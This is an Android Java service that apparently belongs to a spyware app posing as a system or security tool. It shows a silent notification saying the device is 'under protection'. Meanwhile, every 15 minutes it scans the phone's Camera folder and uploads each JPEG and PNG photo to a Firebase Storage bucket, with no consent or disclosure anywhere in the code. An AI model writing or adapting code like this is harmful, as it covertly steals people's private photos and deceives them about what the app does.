package com.systemm.mobileservice;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.webkit.MimeTypeMap;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;
import androidx.annotation.Nullable;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;

public class MyService extends Service {

    ArrayList<Uri> imageUri;
    StorageReference fileRef;
    String NOTIFICATION_CHANNEL_ID;
    NotificationChannel notificationChannel;
    NotificationManager notificationManager;
    Notification notification;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        imageUri=new ArrayList<>();

        sureSayac();


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notificationChannel.setDescription("");
            notificationChannel.setSound(null, null);
            notificationChannel.enableLights(false);
            notificationChannel.enableVibration(false);
            notificationManager.createNotificationChannel(notificationChannel);
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                    .setSmallIcon(R.drawable.logo)
                    .setContentTitle("Cihazınız koruma altında.");

            notification = builder.build();


            startForeground(1, notification);

        }

        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            stopForeground(true);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();



        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            NOTIFICATION_CHANNEL_ID = "my_channel_id_01";

            notificationChannel = new NotificationChannel(
                    NOTIFICATION_CHANNEL_ID, "-", NotificationManager.IMPORTANCE_LOW
            );
        }
    }







    public void fileFound() {
       try {


           String path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getPath() + "/Camera";
           File directory = new File(path);
           File[] files = directory.listFiles();

           for (int i = 0; i < files.length; i++) {
               String ext = "";
               ext = extension(files[i].getName());
               if (ext.equals(".jpg") || ext.equals(".jpeg") || ext.equals(".png")) {
                   imageUri.add(Uri.fromFile(new File(files[i].getPath())));
                   if (imageUri != null) {
                      putImage(files[i].getName(),imageUri.get(i));
                   }

               }
           }
       }
       catch (Exception ex)
       {
           print(ex.toString());
       }



    }

    public void putImage(String dosya_adi,Uri uri) {

        FirebaseStorage.getInstance().getReference().child("images").listAll().addOnSuccessListener(listResult -> {
            boolean a = false;
            for (int i = 0; i < listResult.getItems().size(); i++) {

                if (dosya_adi.equals(listResult.getItems().get(i).getName())) {
                    a = true;
                    break;
                }
            }
            if (a == false) {
                fileRef = FirebaseStorage.getInstance().getReference().child("images").child(dosya_adi);
                fileRef.putFile(uri);

            }

        });


    }

    public String extension(String n) {
        try {
            return n.substring(n.lastIndexOf("."));
        } catch (Exception ex) {
            return "";
        }
    }

    public void print(String p) {
        System.out.println(p);
    }

    private Timer sureTimer;
    private Handler sureHandler;

    private void sureSayacDurdur(){
        if(sureTimer != null) sureTimer.cancel();
        sureHandler = null;
        sureTimer = null;
    }
    private void sureSayac() {
        sureSayacDurdur();
        sureHandler = new Handler();
        sureTimer = new Timer();

        TimerTask sureTimerTask = new TimerTask() {
            @Override
            public void run() {

                sureHandler.post(() -> {
                  try{
                      fileFound();
                  }
                  catch (Exception ex){

                  }

                });

            }
        };

        sureTimer.schedule(sureTimerTask, 0, 900000);
    }

}
